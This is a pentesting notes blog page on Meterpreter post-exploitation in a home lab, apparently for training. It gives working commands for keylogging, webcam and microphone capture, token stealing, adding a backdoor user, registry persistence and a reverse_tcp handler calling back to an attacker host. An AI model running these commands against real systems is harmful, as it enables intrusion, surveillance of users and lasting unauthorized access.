<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Post Exploitation Using Meterpreter | 0x-s0M3n4th's Blog</title><meta name=keywords content="Meterpreter,Metasploit,Post Exploitation"><meta name=description content="Leveraging Meterpreter sessions for internal reconnaissance and privilege escalation."><meta name=author content="0x-s0M3n4th"><link rel=canonical href=https://0x-s0M3n4th.github.io/notes/pen-testing-notes/network-pentesting/08-post-exploitation-techniques/02-post-exploitation-using-meterpreter/><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.css rel="preload stylesheet" as=style><link rel=icon href=https://0x-s0M3n4th.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://0x-s0M3n4th.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://0x-s0M3n4th.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://0x-s0M3n4th.github.io/apple-touch-icon.png><link rel=mask-icon href=https://0x-s0M3n4th.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://0x-s0M3n4th.github.io/notes/pen-testing-notes/network-pentesting/08-post-exploitation-techniques/02-post-exploitation-using-meterpreter/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:url" content="https://0x-s0M3n4th.github.io/notes/pen-testing-notes/network-pentesting/08-post-exploitation-techniques/02-post-exploitation-using-meterpreter/"><meta property="og:site_name" content="0x-s0M3n4th's Blog"><meta property="og:title" content="Post Exploitation Using Meterpreter"><meta property="og:description" content="Leveraging Meterpreter sessions for internal reconnaissance and privilege escalation."><meta property="og:locale" content="en-us"><meta property="og:type" content="article"><meta property="article:section" content="notes"><meta property="article:published_time" content="2025-11-24T13:25:00+05:30"><meta property="article:modified_time" content="2025-11-24T13:25:00+05:30"><meta property="article:tag" content="Meterpreter"><meta property="article:tag" content="Metasploit"><meta property="article:tag" content="Post Exploitation"><meta property="og:image" content="https://0x-s0M3n4th.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://0x-s0M3n4th.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="Post Exploitation Using Meterpreter"><meta name=twitter:description content="Leveraging Meterpreter sessions for internal reconnaissance and privilege escalation."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Notes","item":"https://0x-s0M3n4th.github.io/notes/"},{"@type":"ListItem","position":2,"name":"Network Penetration Testing","item":"https://0x-s0M3n4th.github.io/notes/pen-testing-notes/"},{"@type":"ListItem","position":4,"name":"Post Exploitation Techniques","item":"https://0x-s0M3n4th.github.io/notes/pen-testing-notes/network-pentesting/08-post-exploitation-techniques/"},{"@type":"ListItem","position":5,"name":"Post Exploitation Using Meterpreter","item":"https://0x-s0M3n4th.github.io/notes/pen-testing-notes/network-pentesting/08-post-exploitation-techniques/02-post-exploitation-using-meterpreter/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Post Exploitation Using Meterpreter","name":"Post Exploitation Using Meterpreter","description":"Leveraging Meterpreter sessions for internal reconnaissance and privilege escalation.","keywords":["Meterpreter","Metasploit","Post Exploitation"],"articleBody":" First get a reverse shell from the target machine, in my case it would be Blue and attacker will be kali. Also i have added Blue into the vmnet2 aka PIVOT-NET network. Let’s use the Eternal Blue(MS17-010) exploit to get a reverse shell: user interface options: Establishing a Meterpreter interactive session between the compromised system and your attacker machine enables you to perform actions to collect sensitive and confidential information from the target system. The following is a brief list of useful commands that are used within Meterpreter:\nkeyscan_start: Meterpreter begins capturing the keystrokes entered by a user on the compromised host. keyscan_stop: Stops capturing the keystrokes entered by a user on the compromised system. keyscan_dump: Exports the captured keystrokes into a file. screenshot: Meterpreter will capture a screenshot of the desktop on the compromised host. screenshare: Begins a real-time stream showing the live actions performed by a user on the compromised host. record_mic: Meterpreter activates the microphone on the compromised host and begins recording. webcam_list: Displays a list of webcams available on the compromised host. webcam_snap: Activates the webcam on the compromised host and takes a picture. webcam_stream: Begins a live stream from the webcam on the compromised system. search: Using the search –f command quickly searches on the compromised system for the file. File transfers: To upload a file such as a malicious payload, Meterpreter supports file transfers between the attacker and the compromised host. meterpreter \u003e upload /usr/share/windows-binaries/vncviewer.exe c:\\\\ 2. Spawning a native shell from meterpreter: 3. If we see to the root of the directory and verify if our file is uploaded or not: 4. Use the following command to download a file from the C: directory of the target to the /home/ kali/ directory on Kali Linux:\nmeterpreter \u003e download c:\\\\jack_of_diamonds.png /home/kali/ Important The double backslashes (\\\\) are used as escape characters for Windows-style directory paths and are necessary for Meterpreter to interpret the path correctly\nprivilege escalation using meterpreter: After exploiting a security vulnerability and gaining either a reverse or bind shell, you may not be able to perform administrative actions or tasks on the compromised system due to having low privileges on the compromised machine. Therefore, it’s important to understand the need to escalate your user privileges to a high-privilege user such as the local administrator, a domain administrator, or even the SYSTEM level. Escalating your user privileges on a compromised system simply allows you to modify configurations and perform administrative functions on the victim machine.\nOn Meterpreter, use the getuid command to verify the user privilege that Meterpreter is currently using on the compromised host. Next, execute the use priv command within Meterpreter to load the privilege extension if it’s not loaded already. I am already having NT AUTHORITY\\SYSTEM so it didn’t work. Types of tokens: Delegate tokens: This token is created on a system when a user logs in to that system and provides the privileges to allow the user to perform actions that are within the limitation of their user privileges. Additionally, this type of token is created when a user remotely accesses a Windows host using Microsoft’s RDP. Impersonate token: This type of token allows a user to access remote network services such as file shares and network drives across a network. Open the session of reverse shell, then type load incognito , after that list_tokens -u to see the available tokens. If you do a getuid to check your identity, in my case it’s already SYSTEM which is the highest privilege possible. So i don’t need to impersonate tokens. But you can do that using the command: meterpreter \u003e impersonate_token NT AUTHORITY\\SYSTEM Another technique to impersonate a user such as the local Administrator is to identify a running process on the compromised system that is running using the Administrator’s privileges and steal the token for the process Use the command ps to identify: Let’s say i want to migrate to this process: For stealing the token use the command : steal_token PID Lastly, to revert to SYSTEM-level privileges on Meterpreter, use the following rev2self command. Setting up persistence: After remotely exploiting a security vulnerability within a host, the payload is usually delivered, which allows the penetration tester to gain a reverse shell on the target. Since Meterpreter runs within the memory of the target, the session will be terminated when the compromised host loses power or reaches an inactivity timeout. Implementing persistence on the compromised host will ensure the penetration tester always has access to the target whenever it’s online.\nMeterpreter allows penetration testers to remotely enable RDP on a compromised Windows operating system: meterpreter \u003e run post/windows/manage/enable_rdp 2. Use the shell command within Meterpreter to spawn a Windows native shell, then use the net user pentester password1 /add command to create a new user on the compromised host: 3. Metasploit contains two specific exploit modules that enable penetration testers to set up persistence on a compromised Windows host. These modules are as follows:\nexploit/windows/local/persistence exploit/windows/local/registry_persistence Both of these modules will create a payload that modifies the system registry value located within the HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ location and stores the VBS script in the C:\\WINDOWS\\TEMP\\ directory, causing the payload to execute each time the system boots or when a user logs on. These are very dangerous and should be removed when you have completed the technical aspect of the penetration test within the organization. If these payloads are not removed from the registry and the TEMP folder, a threat actor can gain access to the host machine without authentication. Background the session using ctrl + z and then select the exploit/windows/local/persistence module, set the session number, and configure the module to take effect when the system starts up: msf use exploit/windows/local/persistence msf exploit(windows/local/persistence) \u003e set SESSION 1 msf exploit(windows/local/persistence) \u003e set STARTUP SYSTEM msf exploit(windows/local/persistence) \u003e set LHOST 172.30.1.130 LHOST =\u003e 172.30.1.130 msf exploit(windows/local/persistence) \u003e set LPORT 1234 LPORT =\u003e 1234 msf exploit(windows/local/persistence) \u003e set SESSION 5 SESSION =\u003e 5 You can set STARTUP as user also if you are targeting a specific user to login to the system. 2. Setting up the handler for recieving reverse connection\nmsf6 \u003e use exploit/multi/handler msf6 exploit(multi/handler) \u003e set payload windows/meterpreter/reverse_tcp msf6 exploit(multi/handler) \u003e set AutoRunScript post/windows/manage/ migrate msf6 exploit(multi/handler) \u003e set LHOST 172.30.1.130 msf6 exploit(multi/handler) \u003e set LPORT 1234 msf6 exploit(multi/handler) \u003e exploit whenever the user/administrator will login the PC you will always recieve a connection back sue to the payload.\n","wordCount":"1070","inLanguage":"en","image":"https://0x-s0M3n4th.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E","datePublished":"2025-11-24T13:25:00+05:30","dateModified":"2025-11-24T13:25:00+05:30","author":{"@type":"Person","name":"0x-s0M3n4th"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://0x-s0M3n4th.github.io/notes/pen-testing-notes/network-pentesting/08-post-exploitation-techniques/02-post-exploitation-using-meterpreter/"},"publisher":{"@type":"Organization","name":"0x-s0M3n4th's Blog","logo":{"@type":"ImageObject","url":"https://0x-s0M3n4th.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://0x-s0M3n4th.github.io/ accesskey=h title="0x-s0M3n4th's Blog (Alt + H)"><img src=https://0x-s0M3n4th.github.io/apple-touch-icon.png alt aria-label=logo height=35>0x-s0M3n4th's Blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://0x-s0M3n4th.github.io/archive/ title=Archives><span>Archives</span></a></li><li><a href=https://0x-s0M3n4th.github.io/table-of-contents/ title="Table of contents"><span>Table of contents</span></a></li><li><a href=https://0x-s0M3n4th.github.io/blogs/ title=Blogs><span>Blogs</span></a></li><li><a href=https://0x-s0M3n4th.github.io/notes/ title=Notes><span>Notes</span></a></li><li><a href=https://0x-s0M3n4th.github.io/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li><li><a href=https://0x-s0M3n4th.github.io/tags/ title=tags><span>tags</span></a></li><li><a href=https://0x-s0M3n4th.github.io/resume.pdf title=Resume><span>Resume</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://0x-s0M3n4th.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://0x-s0M3n4th.github.io/notes/>Notes</a>&nbsp;»&nbsp;<a href=https://0x-s0M3n4th.github.io/notes/pen-testing-notes/>Network Penetration Testing</a>&nbsp;»&nbsp;<a href=https://0x-s0M3n4th.github.io/notes/pen-testing-notes/network-pentesting/08-post-exploitation-techniques/>Post Exploitation Techniques</a></div><h1 class="post-title entry-hint-parent">Post Exploitation Using Meterpreter</h1><div class=post-description>Leveraging Meterpreter sessions for internal reconnaissance and privilege escalation.</div><div class=post-meta><span title='2025-11-24 13:25:00 +0530 IST'>November 24, 2025</span>&nbsp;·&nbsp;<span>6 min</span>&nbsp;·&nbsp;<span>1070 words</span>&nbsp;·&nbsp;<span>0x-s0M3n4th</span></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><ul><li><a href=#user-interface-options>user interface options:</a></li></ul></li><li><a href=#file-transfers>File transfers:</a></li><li><a href=#privilege-escalation-using-meterpreter>privilege escalation using meterpreter:</a><ul><li><a href=#types-of-tokens>Types of tokens:</a></li></ul></li><li><a href=#setting-up-persistence>Setting up persistence:</a></li></ul></nav></div></details></div><div class=post-content><ol><li>First get a reverse shell from the target machine, in my case it would be <code>Blue</code> and attacker will be kali. Also i have added <code>Blue</code> into the <code>vmnet2 aka PIVOT-NET</code> network.</li><li>Let&rsquo;s use the <code>Eternal Blue(MS17-010)</code> exploit to get a reverse shell:
<img alt=gs_3 loading=lazy src=/images/Pentesting/NP/PE/02/gs_3.png>
<img alt=gs_4 loading=lazy src=/images/Pentesting/NP/PE/02/gs_4.png>
<img alt=gs_5 loading=lazy src=/images/Pentesting/NP/PE/02/gs_5.png></li></ol><hr><h3 id=user-interface-options>user interface options:<a hidden class=anchor aria-hidden=true href=#user-interface-options>#</a></h3><p>Establishing a Meterpreter interactive session between the compromised system and your attacker machine enables you to perform actions to collect sensitive and confidential information from the
target system.
The following is a brief list of useful commands that are used within Meterpreter:</p><ul><li><code>keyscan_start</code>: Meterpreter begins capturing the keystrokes entered by a user on the compromised host.</li><li><code>keyscan_stop</code>: Stops capturing the keystrokes entered by a user on the compromised system.</li><li><code>keyscan_dump</code>: Exports the captured keystrokes into a file.</li><li><code>screenshot</code>: Meterpreter will capture a screenshot of the desktop on the compromised host.</li><li><code>screenshare</code>: Begins a real-time stream showing the live actions performed by a user on the compromised host.</li><li><code>record_mic</code>: Meterpreter activates the microphone on the compromised host and begins recording.</li><li><code>webcam_list</code>: Displays a list of webcams available on the compromised host.</li><li><code>webcam_snap</code>: Activates the webcam on the compromised host and takes a picture.</li><li><code>webcam_stream</code>: Begins a live stream from the webcam on the compromised system.</li><li><code>search</code>: Using the search –f <code>&lt;filename></code> command quickly searches on the compromised system for the file.</li></ul><hr><h2 id=file-transfers>File transfers:<a hidden class=anchor aria-hidden=true href=#file-transfers>#</a></h2><ol><li>To upload a file such as a malicious payload, Meterpreter supports file transfers between the attacker and the compromised host.</li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>meterpreter &gt; upload /usr/share/windows-binaries/vncviewer.exe c:<span class=se>\\</span>
</span></span></code></pre></div><p><img alt=gs_11 loading=lazy src=/images/Pentesting/NP/PE/02/gs_11.png>
2. Spawning a native shell from meterpreter:
<img alt=gs_12 loading=lazy src=/images/Pentesting/NP/PE/02/gs_12.png>
3. If we see to the root of the directory and verify if our file is uploaded or not:
<img alt=gs_13 loading=lazy src=/images/Pentesting/NP/PE/02/gs_13.png>
4. Use the following command to download a file from the <code>C:</code> directory of the target to the <code>/home/ kali/</code> directory on Kali Linux:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>meterpreter &gt; download c:<span class=se>\\</span>jack_of_diamonds.png /home/kali/
</span></span></code></pre></div><link rel=stylesheet href=/css/vendors/admonitions.4fd9a0b8ec8899f2ca952048d255a569f433f77dfb3f52f5bc87e7d65cdce449.css integrity="sha256-T9mguOyImfLKlSBI0lWlafQz9337P1L1vIfn1lzc5Ek=" crossorigin=anonymous><div class="admonition important"><div class=admonition-header><svg viewBox="0 0 512 512"><path d="M256 512A256 256 0 10256 0a256 256 0 100 512zm0-384c13.3.0 24 10.7 24 24v112c0 13.3-10.7 24-24 24s-24-10.7-24-24V152c0-13.3 10.7-24 24-24zM224 352a32 32 0 1164 0 32 32 0 11-64 0z"/></svg>
<span>Important</span></div><div class=admonition-content><p>The double backslashes <code>(\\)</code> are used as escape characters for Windows-style directory paths and are necessary for Meterpreter to interpret the path correctly</p></div></div><hr><h2 id=privilege-escalation-using-meterpreter>privilege escalation using meterpreter:<a hidden class=anchor aria-hidden=true href=#privilege-escalation-using-meterpreter>#</a></h2><p>After exploiting a security vulnerability and gaining either a reverse or bind shell, you may not be able to perform administrative actions or tasks on the compromised system due to having low privileges on the compromised machine. Therefore, it’s important to understand the need to escalate your user privileges to a high-privilege user such as the local administrator, a domain administrator, or even the SYSTEM level. Escalating your user privileges on a compromised system simply allows you to modify configurations and perform administrative functions on the victim machine.</p><ol><li>On Meterpreter, use the <code>getuid</code> command to verify the user privilege that Meterpreter is currently using on the compromised host.</li><li>Next, execute the use <code>priv</code> command within Meterpreter to load the privilege extension if it’s not loaded already.
<img alt=gs_14 loading=lazy src=/images/Pentesting/NP/PE/02/gs_14.png>
I am already having <code>NT AUTHORITY\SYSTEM</code> so it didn&rsquo;t work.</li></ol><hr><h3 id=types-of-tokens>Types of tokens:<a hidden class=anchor aria-hidden=true href=#types-of-tokens>#</a></h3><ol><li><strong>Delegate tokens</strong>: This token is created on a system when a user logs in to that system and provides the privileges to allow the user to perform actions that are within the limitation of their user privileges. Additionally, this type of token is created when a user remotely accesses a Windows host using Microsoft’s RDP.</li><li><strong>Impersonate token</strong>: This type of token allows a user to access remote network services such as file shares and network drives across a network.</li><li>Open the session of reverse shell, then type <code>load incognito</code> , after that <code>list_tokens -u</code> to see the available tokens.
<img alt=gs_15 loading=lazy src=/images/Pentesting/NP/PE/02/gs_15.png></li><li>If you do a <code>getuid</code> to check your identity, in my case it&rsquo;s already <code>SYSTEM</code> which is the highest privilege possible. So i don&rsquo;t need to impersonate tokens. But you can do that using the command:</li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>meterpreter &gt; impersonate_token NT AUTHORITY<span class=se>\S</span>YSTEM
</span></span></code></pre></div><ol start=5><li>Another technique to impersonate a user such as the local Administrator is to identify a running process on the compromised system that is running using the Administrator’s privileges and steal the token for the process</li><li>Use the command <code>ps</code> to identify:
<img alt=gs_16 loading=lazy src=/images/Pentesting/NP/PE/02/gs_16.png></li><li>Let&rsquo;s say i want to migrate to this process:
<img alt=gs_17 loading=lazy src=/images/Pentesting/NP/PE/02/gs_17.png></li><li>For stealing the token use the command : <code>steal_token PID</code>
<img alt=gs_18 loading=lazy src=/images/Pentesting/NP/PE/02/gs_18.png></li><li>Lastly, to revert to SYSTEM-level privileges on Meterpreter, use the following <code>rev2self</code> command.</li></ol><hr><h2 id=setting-up-persistence>Setting up persistence:<a hidden class=anchor aria-hidden=true href=#setting-up-persistence>#</a></h2><p>After remotely exploiting a security vulnerability within a host, the payload is usually delivered, which allows the penetration tester to gain a reverse shell on the target. Since Meterpreter runs within the memory of the target, the session will be terminated when the compromised host loses power or reaches an inactivity timeout. Implementing persistence on the compromised host will ensure the penetration tester always has access to the target whenever it’s online.</p><ol><li>Meterpreter allows penetration testers to remotely enable <code>RDP</code> on a compromised Windows operating system:</li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>meterpreter &gt; run post/windows/manage/enable_rdp
</span></span></code></pre></div><p><img alt=gs_19 loading=lazy src=/images/Pentesting/NP/PE/02/gs_19.png>
2. Use the <code>shell</code> command within Meterpreter to spawn a Windows native shell, then use the <code>net user pentester password1 /add</code> command to create a new user on the compromised host:
<img alt=gs_20 loading=lazy src=/images/Pentesting/NP/PE/02/gs_20.png>
3. Metasploit contains two specific exploit modules that enable penetration testers to set up persistence on a compromised Windows host. These modules are as follows:</p><ul><li>exploit/windows/local/persistence</li><li>exploit/windows/local/registry_persistence</li><li>Both of these modules will create a payload that modifies the system registry value located within the <code>HKLM\Software\Microsoft\Windows\CurrentVersion\Run\</code> location and stores the <code>VBS script</code> in the <code>C:\WINDOWS\TEMP\</code> directory, causing the payload to execute each time the system boots or when a user logs on. These are very dangerous and should be removed when you have completed the technical aspect of the penetration test within the organization. If these payloads are not removed from the registry and the TEMP folder, a threat actor can gain access to the host machine without authentication.</li></ul><hr><ol><li>Background the session using <code>ctrl + z</code> and then select the <code>exploit/windows/local/persistence</code> module, set the session number, and configure the module to take effect when the system starts up:</li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>msf use exploit/windows/local/persistence 
</span></span><span class=line><span class=cl>msf exploit<span class=o>(</span>windows/local/persistence<span class=o>)</span> &gt; <span class=nb>set</span> SESSION <span class=m>1</span> 
</span></span><span class=line><span class=cl>msf exploit<span class=o>(</span>windows/local/persistence<span class=o>)</span> &gt; <span class=nb>set</span> STARTUP SYSTEM
</span></span><span class=line><span class=cl>msf exploit<span class=o>(</span>windows/local/persistence<span class=o>)</span> &gt; <span class=nb>set</span> LHOST 172.30.1.130
</span></span><span class=line><span class=cl><span class=nv>LHOST</span> <span class=o>=</span>&gt; 172.30.1.130
</span></span><span class=line><span class=cl>msf exploit<span class=o>(</span>windows/local/persistence<span class=o>)</span> &gt; <span class=nb>set</span> LPORT <span class=m>1234</span>
</span></span><span class=line><span class=cl><span class=nv>LPORT</span> <span class=o>=</span>&gt; <span class=m>1234</span>
</span></span><span class=line><span class=cl>msf exploit<span class=o>(</span>windows/local/persistence<span class=o>)</span> &gt; <span class=nb>set</span> SESSION <span class=m>5</span>
</span></span><span class=line><span class=cl><span class=nv>SESSION</span> <span class=o>=</span>&gt; <span class=m>5</span>
</span></span></code></pre></div><p>You can set STARTUP as <code>user</code> also if you are targeting a specific user to login to the system.
<img alt=gs_21 loading=lazy src=/images/Pentesting/NP/PE/02/gs_21.png>
2. Setting up the handler for recieving <code>reverse connection</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>msf6 &gt; use exploit/multi/handler 
</span></span><span class=line><span class=cl>msf6 exploit<span class=o>(</span>multi/handler<span class=o>)</span> &gt; <span class=nb>set</span> payload windows/meterpreter/reverse_tcp 
</span></span><span class=line><span class=cl>msf6 exploit<span class=o>(</span>multi/handler<span class=o>)</span> &gt; <span class=nb>set</span> AutoRunScript post/windows/manage/ migrate 
</span></span><span class=line><span class=cl>msf6 exploit<span class=o>(</span>multi/handler<span class=o>)</span> &gt; <span class=nb>set</span> LHOST 172.30.1.130
</span></span><span class=line><span class=cl>msf6 exploit<span class=o>(</span>multi/handler<span class=o>)</span> &gt; <span class=nb>set</span> LPORT <span class=m>1234</span> msf6 exploit<span class=o>(</span>multi/handler<span class=o>)</span> &gt; exploit
</span></span></code></pre></div><p><img alt=gs_22 loading=lazy src=/images/Pentesting/NP/PE/02/gs_22.png>
whenever the user/administrator will login the PC you will always recieve a connection back sue to the payload.</p></div><footer class=post-footer><ul class=post-tags><li><a href=https://0x-s0M3n4th.github.io/tags/meterpreter/>Meterpreter</a></li><li><a href=https://0x-s0M3n4th.github.io/tags/metasploit/>Metasploit</a></li><li><a href=https://0x-s0M3n4th.github.io/tags/post-exploitation/>Post Exploitation</a></li></ul><ul class=share-buttons><li><a target=_blank rel="noopener noreferrer" aria-label="share Post Exploitation Using Meterpreter on x" href="https://x.com/intent/tweet/?text=Post%20Exploitation%20Using%20Meterpreter&amp;url=https%3a%2f%2f0x-s0M3n4th.github.io%2fnotes%2fpen-testing-notes%2fnetwork-pentesting%2f08-post-exploitation-techniques%2f02-post-exploitation-using-meterpreter%2f&amp;hashtags=Meterpreter%2cMetasploit%2cPostExploitation"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446C483.971.0 512 28.03 512 62.554zM269.951 190.75 182.567 75.216H56L207.216 272.95 63.9 436.783h61.366L235.9 310.383l96.667 126.4H456L298.367 228.367l134-153.151H371.033zM127.633 110h36.468l219.38 290.065H349.5z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Post Exploitation Using Meterpreter on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2f0x-s0M3n4th.github.io%2fnotes%2fpen-testing-notes%2fnetwork-pentesting%2f08-post-exploitation-techniques%2f02-post-exploitation-using-meterpreter%2f&amp;title=Post%20Exploitation%20Using%20Meterpreter&amp;summary=Post%20Exploitation%20Using%20Meterpreter&amp;source=https%3a%2f%2f0x-s0M3n4th.github.io%2fnotes%2fpen-testing-notes%2fnetwork-pentesting%2f08-post-exploitation-techniques%2f02-post-exploitation-using-meterpreter%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Post Exploitation Using Meterpreter on reddit" href="https://reddit.com/submit?url=https%3a%2f%2f0x-s0M3n4th.github.io%2fnotes%2fpen-testing-notes%2fnetwork-pentesting%2f08-post-exploitation-techniques%2f02-post-exploitation-using-meterpreter%2f&title=Post%20Exploitation%20Using%20Meterpreter"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Post Exploitation Using Meterpreter on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2f0x-s0M3n4th.github.io%2fnotes%2fpen-testing-notes%2fnetwork-pentesting%2f08-post-exploitation-techniques%2f02-post-exploitation-using-meterpreter%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Post Exploitation Using Meterpreter on whatsapp" href="https://api.whatsapp.com/send?text=Post%20Exploitation%20Using%20Meterpreter%20-%20https%3a%2f%2f0x-s0M3n4th.github.io%2fnotes%2fpen-testing-notes%2fnetwork-pentesting%2f08-post-exploitation-techniques%2f02-post-exploitation-using-meterpreter%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 